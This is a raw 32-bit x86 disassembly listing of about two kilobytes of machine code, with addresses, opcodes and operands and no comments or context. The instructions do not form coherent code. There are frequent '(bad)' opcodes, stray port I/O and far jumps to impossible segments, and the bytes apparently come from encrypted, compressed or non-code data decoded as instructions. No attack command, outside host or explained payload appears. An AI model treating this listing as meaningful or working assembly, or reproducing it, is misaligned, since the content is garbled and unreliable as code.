  4051e5:	mov    ah,0xce
  4051e7:	imul   eax,DWORD PTR [ecx-0x47],0x31ac097d
  4051ee:	mov    bl,0x6d
  4051f0:	sar    edi,1
  4051f2:	add    eax,0x39ff64f6
  4051f7:	adc    al,0xfa
  4051f9:	or     eax,DWORD PTR [edi+0x5fd57bb2]
  4051ff:	rcr    BYTE PTR [edx+ebx*8+0x4c],cl
  405203:	stc    
  405204:	push   eax
  405205:	imul   edx,DWORD PTR [esi+0x39],0xffffffdb
  405209:	sbb    DWORD PTR [eax-0x2a],esp
  40520c:	jp     0x4051d1
  40520e:	and    BYTE PTR [edi+0x52f06ebe],bh
  405214:	aaa    
  405215:	data16 mov bl,0x1c
  405218:	int3   
  405219:	or     DWORD PTR [ecx+0x1f9db6af],0x28
  405220:	aad    0x0
  405222:	arpl   WORD PTR [ebp+0x4f],si
  405225:	or     eax,0x929754d9
  40522a:	hlt    
  40522b:	cmp    BYTE PTR [ebx-0x42222db4],dl
  405231:	push   ebp
  405232:	gs dec ebp
  405234:	popa   
  405235:	hlt    
  405236:	cmp    edi,DWORD PTR [eax+0x5b]
  405239:	push   ecx
  40523a:	pop    ds
  40523b:	dec    ebp
  40523c:	dec    esp
  40523d:	ins    BYTE PTR es:[edi],dx
  40523e:	fdivr  DWORD PTR es:[esi-0x38]
  405242:	mov    bl,0xa9
  405244:	(bad)  
  405245:	cs jb  0x4051ff
  405248:	loopne 0x4051ce
  40524a:	mov    ebx,0x9233d0c5
  40524f:	or     ch,ah
  405251:	or     al,0xf5
  405253:	mov    eax,ds:0xa73a79b6
  405258:	icebp  
  405259:	pop    edi
  40525a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40525b:	fisubr DWORD PTR [eax-0x4938a151]
  405261:	mov    ecx,0x1fba59b7
  405266:	sub    edi,DWORD PTR [eax]
  405268:	jo     0x4051ec
  40526a:	pop    edi
  40526b:	sub    DWORD PTR [edi-0x4cd0773e],ecx
  405271:	jecxz  0x4052db
  405273:	mov    ecx,0xb998f1aa
  405278:	and    eax,0xd06b5e33
  40527d:	scas   eax,DWORD PTR es:[edi]
  40527e:	jns    0x4052b9
  405280:	mov    DWORD PTR [ebp-0xdab1efc],esi
  405286:	mov    ch,0xc1
  405288:	adc    ecx,DWORD PTR [esi+0x38]
  40528b:	imul   edi,DWORD PTR [esi],0xffffff8d
  40528e:	cmp    eax,0xc0f2bc5a
  405293:	mov    edi,gs
  405295:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405296:	push   ebx
  405297:	repnz lods al,BYTE PTR ds:[esi]
  405299:	jle    0x4052f9
  40529b:	push   0xffffffb6
  40529d:	in     al,dx
  40529e:	or     cl,BYTE PTR [ebx+0x0]
  4052a1:	or     ebp,DWORD PTR [edi]
  4052a3:	ret    
  4052a4:	xchg   edx,eax
  4052a5:	ficom  DWORD PTR [ecx]
  4052a7:	ja     0x4052f2
  4052a9:	fstp   st(4)
  4052ab:	std    
  4052ac:	pop    es
  4052ad:	jecxz  0x40532c
  4052af:	leave  
  4052b0:	push   cs
  4052b1:	jns    0x4052f7
  4052b3:	cmp    ch,BYTE PTR [ebx]
  4052b5:	inc    esp
  4052b6:	pop    ecx
  4052b7:	sub    al,0x72
  4052b9:	pop    ss
  4052ba:	mov    ds:0xeab244fd,al
  4052bf:	test   al,0x43
  4052c1:	lock sub BYTE PTR ds:0xa97a956a,0xac
  4052c9:	jmp    0xd83de3a3
  4052ce:	push   0xc40510d5
  4052d3:	add    eax,edi
  4052d5:	nop
  4052d6:	ins    DWORD PTR es:[edi],dx
  4052d7:	sub    al,0xe0
  4052d9:	lea    edi,[ebx-0x14]
  4052dc:	retf   0x4e94
  4052df:	xchg   ebp,eax
  4052e0:	sbb    ecx,edx
  4052e2:	mov    BYTE PTR [edx-0x2f],ah
  4052e5:	dec    eax
  4052e6:	add    dh,BYTE PTR [ecx-0x3c408b11]
  4052ec:	loop   0x405324
  4052ee:	mov    ebp,0xcfe32b37
  4052f3:	ins    DWORD PTR es:[edi],dx
  4052f4:	xor    al,0x71
  4052f6:	fcmovnu st,st(2)
  4052f8:	out    0x64,al
  4052fa:	(bad)  
  4052fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4052fc:	mov    ecx,?
  4052fe:	and    eax,0xbdbe40ee
  405303:	xor    al,0xa1
  405305:	inc    esi
  405306:	aaa    
  405307:	cmp    edx,esp
  405309:	daa    
  40530a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40530b:	push   edi
  40530c:	jecxz  0x405304
  40530e:	and    eax,0xf6cacf98
  405313:	dec    esi
  405314:	pushf  
  405315:	xchg   esp,eax
  405316:	sub    eax,0x3d333c70
  40531b:	out    dx,eax
  40531c:	loopne 0x405386
  40531e:	ret    
  40531f:	lods   al,BYTE PTR ds:[esi]
  405320:	dec    ecx
  405321:	dec    ebx
  405322:	jmp    0xf12:0x2ad95280
  405329:	and    bl,al
  40532b:	ror    DWORD PTR [edx+eiz*8+0x7a8d40a7],1
  405332:	pop    ss
  405333:	mov    esi,DWORD PTR [ebx+0x27a408e2]
  405339:	addr16 in al,0xd6
  40533c:	and    bh,BYTE PTR [ecx]
  40533e:	sub    ecx,ecx
  405340:	pop    edx
  405341:	dec    ebx
  405342:	cmp    eax,0x6cde6b88
  405347:	pop    edi
  405348:	imul   edx,edi,0xe5e0444c
  40534e:	pop    edx
  40534f:	mov    ebp,0xe79a5b1d
  405354:	rcl    BYTE PTR [esi],cl
  405356:	pop    ds
  405357:	jge    0x4053cf
  405359:	and    bl,BYTE PTR [edx-0x7d267ff]
  40535f:	ins    DWORD PTR es:[edi],dx
  405360:	div    BYTE PTR [ecx]
  405362:	and    DWORD PTR [edi+ebx*2-0x4db48736],edx
  405369:	mov    eax,ds:0x32655c62
  40536e:	push   esi
  40536f:	aad    0xf5
  405371:	push   edx
  405372:	sbb    BYTE PTR [esi],dl
  405374:	imul   edx,DWORD PTR [ecx+0x6b],0x69
  405378:	pop    es
  405379:	int    0xb2
  40537b:	mov    ch,0x0
  40537d:	cmc    
  40537e:	daa    
  40537f:	repnz mov ebp,0xe8085373
  405385:	dec    ebx
  405386:	test   al,0x5e
  405388:	iret   
  405389:	inc    ecx
  40538a:	mov    bh,0xd7
  40538c:	jmp    0xcd587987
  405391:	add    al,BYTE PTR [edx+ebp*1]
  405394:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405395:	xchg   DWORD PTR [esi],eax
  405397:	xchg   edi,eax
  405398:	stos   DWORD PTR es:[edi],eax
  405399:	lahf   
  40539a:	popa   
  40539b:	fild   DWORD PTR [esi-0x1c182ddb]
  4053a1:	mov    eax,ds:0x55586816
  4053a6:	pushf  
  4053a7:	and    ebx,DWORD PTR [ebp+0x99750b5]
  4053ad:	mov    fs,WORD PTR [esi+eax*2-0x31]
  4053b1:	stos   DWORD PTR es:[edi],eax
  4053b2:	pop    eax
  4053b3:	bound  esp,QWORD PTR [edi-0x493c6564]
  4053b9:	and    dl,BYTE PTR [ebp+0x57beda8c]
  4053bf:	add    BYTE PTR [ebp-0x7d],bl
  4053c2:	mov    ch,0xde
  4053c4:	(bad)  
  4053c5:	ss loope 0x405349
  4053c8:	xor    BYTE PTR [ebx+0x14],0xc4
  4053cc:	push   cs
  4053cd:	or     dh,al
  4053cf:	ret    
  4053d0:	mov    ds:0xf8efefa9,eax
  4053d5:	pop    es
  4053d6:	jmp    0x9f0b:0x3e41b28c
  4053dd:	fcom   QWORD PTR [ebp-0xd4db8e5]
  4053e3:	push   edx
  4053e4:	(bad)  
  4053e5:	pop    esi
  4053e6:	cmp    ebx,DWORD PTR [edi-0x6cc898d8]
  4053ec:	mov    eax,0xe6e1ecdd
  4053f1:	mov    eax,ds:0x6ac07ccb
  4053f6:	push   ss
  4053f7:	in     eax,0xa8
  4053f9:	cdq    
  4053fa:	adc    BYTE PTR [ebx+0x2b],ch
  4053fd:	out    dx,al
  4053fe:	std    
  4053ff:	jmp    0x40542d
  405401:	add    al,0xba
  405403:	xchg   ebx,eax
  405404:	dec    edi
  405405:	inc    edi
  405406:	stos   BYTE PTR es:[edi],al
  405407:	fdiv   st,st(1)
  405409:	xchg   ecx,eax
  40540a:	ret    
  40540b:	pusha  
  40540c:	mov    esi,0x13764147
  405411:	mov    bl,0xea
  405413:	add    cl,al
  405415:	and    bh,BYTE PTR [ebp-0x4e60cfb3]
  40541b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40541c:	add    ah,cl
  40541e:	scas   eax,DWORD PTR es:[edi]
  40541f:	lods   eax,DWORD PTR ds:[esi]
  405420:	ret    0x82c0
  405423:	jno    0x4053d7
  405425:	test   eax,0x2e251b73
  40542a:	rol    DWORD PTR [edx+0x20],0xdf
  40542e:	ins    BYTE PTR es:[edi],dx
  40542f:	repz fwait
  405431:	or     DWORD PTR [eax-0x6d],eax
  405434:	cmc    
  405435:	and    bh,bl
  405437:	ret    0x1d04
  40543a:	pop    ss
  40543b:	or     DWORD PTR [esi+0x7c],eax
  40543e:	rol    DWORD PTR [edi-0x6efd5e65],cl
  405444:	and    eax,0xf004654e
  405449:	sbb    esi,DWORD PTR [ecx-0x31]
  40544c:	aam    0xa1
  40544e:	lods   eax,DWORD PTR ds:[esi]
  40544f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405450:	pop    ebp
  405451:	int3   
  405452:	mov    esi,0x6c601fa7
  405457:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405458:	stc    
  405459:	push   esi
  40545a:	mov    ds,ecx
  40545c:	mov    cl,0x5c
  40545e:	cdq    
  40545f:	dec    ecx
  405460:	jnp    0x405422
  405462:	pushf  
  405463:	jne    0x405453
  405465:	jle    0x405455
  405467:	call   0x856386
  40546c:	pop    es
  40546d:	jmp    0x75435617
  405472:	(bad)  
  405474:	jmp    0x405453
  405476:	inc    eax
  405477:	inc    eax
  405478:	push   edi
  405479:	and    eax,DWORD PTR [edx+0x15529348]
  40547f:	and    dh,BYTE PTR [edi]
  405481:	imul   ebp,DWORD PTR [ecx-0x76],0x2f3b3b40
  405488:	call   0x70e0:0xfe34e6c3
  40548f:	test   DWORD PTR [ebp+0x52059926],ebx
  405495:	test   DWORD PTR [ebp-0x51c3f11d],0x4af065b3
  40549f:	mov    WORD PTR [edx],cs
  4054a1:	div    DWORD PTR [edi+ebx*8]
  4054a4:	scas   al,BYTE PTR es:[edi]
  4054a5:	fs xor al,0xc6
  4054a8:	out    0x2d,eax
  4054aa:	jns    0x40544b
  4054ac:	outs   dx,BYTE PTR ds:[esi]
  4054ad:	mov    esp,esp
  4054af:	shr    BYTE PTR [ebx-0x24],cl
  4054b2:	jge    0x40547b
  4054b4:	mov    al,ds:0x8804b36e
  4054b9:	inc    ebx
  4054ba:	rcl    DWORD PTR [eax-0x13929b16],cl
  4054c0:	mov    cl,0xfe
  4054c2:	shl    BYTE PTR [edi-0x1],cl
  4054c5:	cmp    eax,0x645fb69e
  4054ca:	les    ecx,FWORD PTR [edi]
  4054cc:	outs   dx,DWORD PTR ds:[esi]
  4054cd:	xchg   BYTE PTR [esi],dh
  4054cf:	push   es
  4054d0:	mov    esp,0x24a79576
  4054d5:	xor    DWORD PTR [edx-0x7cc2a982],ebx
  4054db:	retf   0x29f1
  4054de:	mov    al,0xa9
  4054e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4054e1:	pop    ebp
  4054e2:	in     eax,dx
  4054e3:	mov    edi,0x2045322
  4054e8:	mov    edx,DWORD PTR [ebp+0x194d59a5]
  4054ee:	mov    eax,0x5bd44533
  4054f3:	jp     0x40550a
  4054f5:	or     al,ch
  4054f7:	cmp    DWORD PTR [ebp-0x41cc67e2],esi
  4054fd:	(bad)  
  4054fe:	fmul   DWORD PTR [ebp-0x2a9cb10d]
  405504:	mov    cl,0x9a
  405506:	mov    ds:0x4324421f,eax
  40550b:	cs stos BYTE PTR es:[edi],al
  40550d:	jnp    0x40557a
  40550f:	xor    eax,0xf5d49721
  405514:	dec    esi
  405515:	sub    eax,0x4c8fc275
  40551a:	call   0x65a0ff5d
  40551f:	dec    ebx
  405520:	hlt    
  405521:	fwait
  405522:	add    ebp,esp
  405524:	je     0x4054e6
  405526:	fadd   QWORD PTR [edi-0x12]
  405529:	inc    eax
  40552a:	or     bh,BYTE PTR [esi+eiz*2+0x3f5e2fec]
  405531:	add    BYTE PTR [ebp-0x6],bh
  405534:	test   al,0x96
  405536:	inc    esi
  405537:	das    
  405538:	push   cs
  405539:	test   BYTE PTR [eax+0x6c],dl
  40553c:	sub    DWORD PTR [edi],ebp
  40553e:	mov    ch,0x46
  405540:	cmp    dh,BYTE PTR [ebx]
  405542:	inc    esi
  405543:	in     al,0xd0
  405545:	pop    DWORD PTR [edi+0x1637e441]
  40554b:	cmp    ebx,DWORD PTR [esi-0x53cda563]
  405551:	sti    
  405552:	or     eax,0x7382f6d
  405557:	cmp    al,0x13
  405559:	mov    ebp,0x3a894688
  40555e:	lods   al,BYTE PTR ds:[esi]
  40555f:	pop    ds
  405560:	cmp    esi,esi
  405562:	lock mov dh,0x1d
  405565:	loope  0x4055d4
  405567:	xchg   edi,eax
  405568:	jmp    0x405513
  40556a:	(bad)  
  40556b:	pop    edx
  40556c:	fwait
  40556d:	repz aad 0xf0
  405570:	adc    ecx,DWORD PTR [esi+0x14e62362]
  405576:	push   edx
  405577:	add    eax,0x197c7811
  40557c:	sar    DWORD PTR [eax],1
  40557e:	and    esp,ecx
  405580:	jg     0x405519
  405582:	jne    0x4055cb
  405584:	mov    dl,0xf7
  405586:	mov    al,ds:0xf06dc2f8
  40558b:	xor    al,0xf0
  40558d:	mov    DWORD PTR [ebx-0x6],0x11e41a4e
  405594:	in     eax,0x3a
  405596:	mov    bh,bh
  405598:	xor    cl,BYTE PTR [esi+0x6]
  40559b:	push   edx
  40559c:	adc    al,0x22
  40559e:	int    0x20
  4055a0:	leave  
  4055a1:	sbb    BYTE PTR [edi],0x7
  4055a4:	push   ecx
  4055a5:	gs jmp 0xdfe353d9
  4055ab:	ins    DWORD PTR es:[edi],dx
  4055ac:	jp     0x40560a
  4055ae:	mov    dl,0x2b
  4055b0:	ins    DWORD PTR es:[edi],dx
  4055b1:	sbb    edx,DWORD PTR [ecx-0x3]
  4055b4:	pop    ss
  4055b5:	dec    ecx
  4055b6:	push   ecx
  4055b7:	call   0xe754:0xe5de283f
  4055be:	pop    DWORD PTR [ebx-0x35986348]
  4055c4:	fild   QWORD PTR [ecx]
  4055c6:	pop    edx
  4055c7:	push   ecx
  4055c8:	lods   al,BYTE PTR ds:[esi]
  4055c9:	mov    BYTE PTR [ebp-0x72399927],dh
  4055cf:	fist   WORD PTR [edx+eiz*2]
  4055d2:	cmp    al,ch
  4055d4:	(bad)  
  4055d5:	popa   
  4055d6:	inc    ebp
  4055d7:	and    esi,DWORD PTR [edi+edi*2]
  4055da:	test   al,0x4b
  4055dc:	adc    BYTE PTR [edi+ebx*8-0x6f],0x83
  4055e1:	dec    ebp
  4055e2:	or     al,0xa2
  4055e4:	xchg   edx,eax
  4055e5:	sar    BYTE PTR [eax+0x17bc780c],0x74
  4055ec:	cmp    BYTE PTR [eax+ebp*8-0x54],dh
  4055f0:	jmp    0x4055b9
  4055f2:	lds    eax,FWORD PTR [esi]
  4055f4:	pop    edi
  4055f5:	(bad)  
  4055f6:	out    0x8e,eax
  4055f8:	ds in  eax,dx
  4055fa:	sbb    ecx,DWORD PTR [ecx+eax*8+0x40]
  4055fe:	fistp  DWORD PTR [ebx+edi*4-0x8]
  405602:	mov    cs,WORD PTR [edx]
  405604:	sub    dl,dh
  405606:	mov    DWORD PTR [esi+edx*1+0x5c],ebp
  40560a:	aad    0x29
  40560c:	mov    dl,0x9b
  40560e:	push   esi
  40560f:	xchg   BYTE PTR [ecx-0x39],dh
  405612:	out    dx,eax
  405613:	dec    ebp
  405614:	dec    ebx
  405615:	mov    edi,0xfba2bc6c
  40561a:	xchg   esi,eax
  40561b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40561c:	lea    edx,[edi-0x69]
  40561f:	ror    BYTE PTR ds:[eax],0x87
  405623:	icebp  
  405624:	arpl   WORD PTR [ecx],bx
  405626:	dec    ebx
  405627:	xor    edx,DWORD PTR [eax-0x3f]
  40562a:	pop    edi
  40562b:	lods   al,BYTE PTR ds:[esi]
  40562c:	adc    DWORD PTR [eax-0x44],ecx
  40562f:	out    dx,al
  405630:	cmp    al,0x2f
  405632:	mov    eax,ds:0xadcc5958
  405637:	js     0x4055f7
  405639:	mov    bl,0xee
  40563b:	outs   dx,DWORD PTR ds:[esi]
  40563c:	inc    esp
  40563d:	mov    dh,0xa8
  40563f:	daa    
  405640:	inc    eax
  405641:	mov    BYTE PTR [ebp+0x68aed4b0],cl
  405647:	addr16 jmp 0x8d30587b
  40564d:	lds    edx,FWORD PTR [ebp+ecx*8-0x653515bc]
  405654:	xor    al,0xc
  405656:	cmp    DWORD PTR [esi+0x7e],ebx
  405659:	mov    ds:0x612dabb,eax
  40565e:	outs   dx,BYTE PTR ds:[esi]
  40565f:	rol    dl,1
  405661:	test   al,0xd1
  405663:	and    BYTE PTR [edx-0x45],0x2b
  405667:	sar    DWORD PTR [ebx-0x6d],cl
  40566a:	pushf  
  40566b:	mov    cs,WORD PTR [ebx-0x6f]
  40566e:	mov    al,ds:0x14f4a10b
  405673:	add    ecx,ebp
  405675:	and    bl,BYTE PTR [eax+0x7f]
  405678:	cli    
  405679:	mov    DWORD PTR [edx-0x9ac7c11],ebp
  40567f:	(bad)  
  405680:	imul   esp,DWORD PTR [edi+eax*8-0x6e9c1ae5],0x1f
  405688:	and    dh,0xb8
  40568b:	dec    ebp
  40568c:	js     0x405677
  40568e:	pusha  
  40568f:	dec    edi
  405690:	loope  0x4056be
  405692:	sub    DWORD PTR [ebx+0x72],ecx
  405695:	and    dl,BYTE PTR [eax+0x6d]
  405698:	mov    ah,0xd0
  40569a:	jecxz  0x4056f9
  40569c:	loopne 0x4056dc
  40569e:	test   eax,0xcd83551d
  4056a3:	sbb    cl,bl
  4056a5:	mov    edx,0x390829a4
  4056aa:	mov    bh,0x74
  4056ac:	fs lock pop esi
  4056af:	mov    ebx,0x3ff65d33
  4056b4:	mov    BYTE PTR [eax+0xa8f54d7],bh
  4056ba:	add    al,0x82
  4056bc:	(bad)  
  4056bd:	ds pushw 0xd
  4056c1:	mov    DWORD PTR [esi-0x18],esi
  4056c4:	arpl   WORD PTR [eax-0xf],sp
  4056c7:	adc    DWORD PTR [ebp+0x7c],ecx
  4056ca:	out    0xff,eax
  4056cc:	mov    dl,0x5e
  4056ce:	aas    
  4056cf:	cs repz call 0x2219567
  4056d6:	or     dl,BYTE PTR [ebx]
  4056d8:	lea    edi,[ecx-0x59]
  4056db:	bound  edx,QWORD PTR [eax+0x30b5739f]
  4056e1:	jae    0x4056ba
  4056e3:	ds sub eax,0x3a2e233f
  4056e9:	pop    ecx
  4056ea:	dec    ebp
  4056eb:	mov    cl,0xa6
  4056ed:	fisttp QWORD PTR [eax+0x620894c1]
  4056f3:	outs   dx,BYTE PTR gs:[esi]
  4056f5:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  4056f7:	lods   al,BYTE PTR ds:[esi]
  4056f8:	pop    ebp
  4056f9:	pop    edi
  4056fa:	mov    eax,0xbf8126d3
  4056ff:	mov    edi,0xb92c190a
  405704:	or     WORD PTR [ecx-0x57],0xffb2
  405709:	add    DWORD PTR [ecx+0x24],ecx
  40570c:	push   eax
  40570d:	lods   al,BYTE PTR ds:[esi]
  40570e:	mov    dl,al
  405710:	jg     0x40573b
  405712:	loope  0x405733
  405714:	std    
  405715:	lds    eax,FWORD PTR [ecx]
  405717:	(bad)  
  405718:	xchg   edi,eax
  405719:	add    bl,ah
  40571b:	xchg   ebp,eax
  40571c:	pop    edi
  40571d:	adc    eax,0xb9886cc8
  405722:	mov    bl,0xcc
  405724:	push   esp
  405725:	inc    edx
  405726:	jae    0x405773
  405728:	cmp    eax,0xa425f1e9
  40572d:	push   0x77cac34c
  405732:	adc    bl,BYTE PTR [esp+ebp*1+0x678fd316]
  405739:	adc    BYTE PTR [edx],al
  40573b:	xor    DWORD PTR [edx+ebx*8],ebp
  40573e:	mov    edi,0x111b165
  405743:	pop    ecx
  405744:	fwait
  405745:	push   esp
  405746:	mov    DWORD PTR ds:0x9d20a64a,eax
  40574c:	mov    ebx,0x7477445b
  405751:	enter  0xde51,0x6f
  405755:	daa    
  405756:	fiadd  DWORD PTR ds:0x581e218a
  40575c:	add    esi,DWORD PTR [esi-0x2f]
  40575f:	(bad)  
  405760:	inc    ebx
  405761:	fst    DWORD PTR [esi-0x3c]
  405764:	push   ds
  405765:	mov    al,0x2b
  405767:	pop    esi
  405768:	jecxz  0x4056ea
  40576a:	jle    0x40574f
  40576c:	cld    
  40576d:	push   eax
  40576e:	clc    
  40576f:	ss ins DWORD PTR es:[edi],dx
  405771:	mov    dl,0xed
  405773:	mov    esi,0x54a89f0c
  405778:	and    al,0xfe
  40577a:	adc    al,0x8e
  40577c:	inc    esp
  40577d:	scas   eax,DWORD PTR es:[edi]
  40577e:	pop    esi
  40577f:	push   ds
  405780:	icebp  
  405781:	xor    ebp,DWORD PTR [ebp-0xd]
  405784:	neg    DWORD PTR [edx+ebx*2]
  405787:	pop    ebp
  405788:	xlat   BYTE PTR ds:[ebx]
  405789:	push   0xffffffef
  40578b:	into   
  40578c:	fwait
  40578d:	cmc    
  40578e:	xchg   BYTE PTR [edi],dl
  405790:	call   0xf2e4fdc3
  405795:	add    dh,bh
  405797:	push   esp
  405798:	mov    esp,0x950e7d45
  40579d:	push   0x5d
  40579f:	add    al,0x92
  4057a1:	dec    ecx
  4057a2:	pop    ss
  4057a3:	jbe    0x405776
  4057a5:	add    dl,BYTE PTR [ebx]
  4057a7:	les    ebp,FWORD PTR [ecx+0x68]
  4057aa:	push   cs
  4057ab:	pop    ebx
  4057ac:	fwait
  4057ad:	mov    cl,0x1
  4057af:	hlt    
  4057b0:	xchg   esp,eax
  4057b1:	call   0x5d21b2e5
  4057b6:	dec    BYTE PTR [eax]
  4057b8:	or     esi,DWORD PTR [edi+0x60]
  4057bb:	imul   DWORD PTR [edi]
  4057bd:	jne    0x4057b8
  4057bf:	adc    ebx,DWORD PTR [edi-0x66f31680]
  4057c5:	loope  0x405812
  4057c7:	int3   
  4057c8:	pop    edx
  4057c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4057ca:	jae    0x4057b0
  4057cc:	fadd   st,st(4)
  4057ce:	push   ebp
  4057cf:	cmp    ah,dl
  4057d1:	mov    bh,0xc5
  4057d3:	xchg   esi,eax
  4057d4:	push   cs
  4057d5:	sbb    BYTE PTR [esi-0x2ad52aa4],ah
  4057db:	push   es
  4057dc:	sub    al,0xc4
  4057de:	xchg   esi,eax
  4057df:	and    eax,0x47593e08
  4057e4:	retf   
  4057e5:	stos   DWORD PTR es:[edi],eax
  4057e6:	mov    al,0x58
  4057e8:	fiadd  DWORD PTR [esi]
  4057ea:	cwde   
  4057eb:	jbe    0x4057df
  4057ed:	and    ch,BYTE PTR [eax]
  4057ef:	cld    
  4057f0:	and    al,0xcf
  4057f2:	sub    eax,0xcc29f560
  4057f7:	imul   ebp,DWORD PTR [ecx*1+0x4628411b],0x29d063a1
  405802:	icebp  
  405803:	xor    dl,ah
  405805:	popa   
  405806:	dec    esp
  405807:	dec    edi
  405808:	push   eax
  405809:	loop   0x4057dd
  40580b:	mov    al,ds:0x589532fc
  405810:	mov    ecx,0x4b59b429
  405815:	std    
  405816:	(bad)  
  405817:	jae    0x40588f
  405819:	jne    0x4057aa
  40581b:	inc    BYTE PTR [edi]
  40581d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40581e:	cmp    BYTE PTR [eax+0x62],cl
  405821:	aam    0x3a
  405823:	xchg   ecx,eax
  405824:	xor    edi,ebx
  405826:	dec    edx
  405827:	mov    eax,ds:0x21e1b2ab
  40582c:	adc    al,0xe5
  40582e:	xor    edi,eax
  405830:	inc    ebx
  405831:	stos   DWORD PTR es:[edi],eax
  405832:	sub    BYTE PTR [edi],bh
  405834:	imul   eax,edx,0xd457f924
  40583a:	leave  
  40583b:	stc    
  40583c:	inc    esp
  40583d:	(bad)  
  40583e:	fwait
  40583f:	mov    eax,ds:0x9b948a9e
  405844:	fist   DWORD PTR [ebx-0x401a920]
  40584a:	fmul   DWORD PTR [ecx]
  40584c:	imul   ebp,ebx,0xe638ec25
  405852:	mov    ch,0x9a
  405854:	pop    ss
  405855:	mul    DWORD PTR [esi-0x20]
  405858:	stos   BYTE PTR es:[edi],al
  405859:	sub    DWORD PTR [ebx],ecx
  40585b:	inc    edi
  40585c:	ja     0x40584d
  40585e:	dec    esi
  40585f:	int3   
  405860:	push   edx
  405861:	inc    esi
  405862:	test   DWORD PTR [edi+0x1dcc40de],0x5a988341
  40586c:	sub    esi,0x5a
  40586f:	repz test eax,0x54ce6bd
  405875:	or     eax,0x66cc08a2
  40587a:	ja     0x40587f
  40587c:	mov    ebx,0x490fb64f
  405881:	addr16 js 0x4058f7
  405884:	sbb    BYTE PTR [edx+0x2],bl
  405887:	and    DWORD PTR [esi-0x3815166e],edi
  40588d:	sub    edx,ecx
  40588f:	dec    esp
  405890:	and    ebx,DWORD PTR [eax]
  405892:	ror    DWORD PTR [ebp+0x5d],cl
  405895:	adc    BYTE PTR [eax],cl
  405897:	fdivp  st(4),st
  405899:	mov    ecx,0x1d9632b9
  40589e:	xchg   ebp,eax
  40589f:	jmp    0x4058a6
  4058a1:	cdq    
  4058a2:	daa    
  4058a3:	push   ecx
  4058a4:	xchg   esi,eax
  4058a5:	cli    
  4058a6:	cmp    eax,DWORD PTR [esi+0xaea827]
  4058ac:	scas   al,BYTE PTR es:[edi]
  4058ad:	xchg   edx,eax
  4058ae:	aaa    
  4058af:	push   ds
  4058b0:	cmp    al,0x5d
  4058b2:	xor    DWORD PTR [esi-0x4f],ebx
  4058b5:	or     BYTE PTR [edi-0x2f],ah
  4058b8:	push   0xb9cf1bf0
  4058bd:	into   
  4058be:	pop    esi
  4058bf:	pop    ds
  4058c0:	mov    al,ds:0x140f2b16
  4058c5:	fwait
  4058c6:	add    BYTE PTR [edi-0x49],ah
  4058c9:	sbb    BYTE PTR [eax-0x68],dh
  4058cc:	or     DWORD PTR [edx],eax
  4058ce:	scas   al,BYTE PTR es:[edi]
  4058cf:	sar    BYTE PTR [ecx-0xfc09d9a],cl
  4058d5:	mov    ebx,0x271382d6
  4058da:	dec    ebx
  4058db:	sub    ecx,DWORD PTR [ebx]
  4058dd:	add    BYTE PTR [edx+0x1eb06c05],bh
  4058e3:	or     ecx,eax
  4058e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4058e6:	xchg   ebp,eax
  4058e7:	not    DWORD PTR [eax+esi*2-0x1f]
  4058eb:	(bad)  
  4058ec:	into   
  4058ed:	xor    BYTE PTR [edx],al
  4058ef:	sub    edi,0x5c
  4058f2:	ror    BYTE PTR [edx+ebp*4],0xd2
  4058f6:	adc    eax,0xd669b8a2
  4058fb:	fsubrp st(3),st
  4058fd:	xchg   ebp,eax
  4058fe:	add    DWORD PTR [ebx-0x2d],ebp
  405901:	inc    edi
  405902:	and    DWORD PTR cs:[eax-0x364e5376],ebx
  405909:	mov    ds:0xa683d0ef,al
  40590e:	nop
  40590f:	dec    di
  405911:	mov    ecx,0xf92bfd24
  405916:	daa    
  405917:	xor    ecx,eax
  405919:	es push ecx
  40591b:	xchg   BYTE PTR [edx],bh
  40591d:	cmp    dl,BYTE PTR [edx+0x30287591]
  405923:	mov    ebp,0x664384b3
  405928:	(bad)  
  405929:	mov    bh,0x44
  40592b:	push   es
  40592c:	add    eax,0x993ceaf
  405931:	inc    esp
  405932:	ins    DWORD PTR es:[edi],dx
  405933:	out    dx,al
  405934:	into   
  405935:	jg     0x40590e
  405937:	inc    esp
  405938:	inc    esp
  405939:	cdq    
  40593a:	bound  ecx,QWORD PTR [ebx-0x1d]
  40593d:	pop    eax
  40593e:	bound  edx,QWORD PTR [esi]
  405940:	jne    0x4059b4
  405942:	retf   0xa825
  405945:	lea    ebp,[eax+ecx*1]
  405948:	das    
  405949:	in     eax,0xde
  40594b:	and    al,dl
  40594d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40594e:	dec    ebp
  40594f:	and    DWORD PTR [ebp+0x3a070ee3],0x952ef205
  405959:	or     DWORD PTR [ecx+eiz*1],0x2a903722
  405960:	aad    0x2f
  405962:	xor    BYTE PTR [edx+0x30],ah
  405965:	push   ebp
  405966:	call   0xaa5dab70
  40596b:	ds xchg edi,eax
  40596d:	mov    ah,0x8b
  40596f:	adc    al,ch
  405971:	mov    eax,ds:0x37de7c8b
  405976:	add    al,0xc
  405978:	xor    edx,DWORD PTR [ebx+0x89f66f2]
  40597e:	add    eax,0x47707394
  405983:	inc    edx
  405984:	cs fwait
  405986:	mov    bl,0x77
  405988:	or     eax,0x215216c3
  40598d:	lea    esi,[ebx]
  40598f:	addr16 xchg edx,eax
  405991:	ret    
  405992:	adc    bh,BYTE PTR [ecx]
  405994:	sub    ebp,esi
  405996:	push   ds
  405997:	push   0xfa419c91
  40599c:	dec    ah
  40599e:	xchg   ebp,eax
  40599f:	sbb    BYTE PTR [edx],dl
  4059a1:	add    eax,0xcfa346
  4059a6:	sub    al,al
  4059a8:	test   al,0x37
  4059aa:	retf   0x617
  4059ad:	loopne 0x405957
  4059af:	repnz imul eax,DWORD PTR [ecx+0xe],0xffffffdc
  4059b4:	cdq    
  4059b5:	int    0xcb
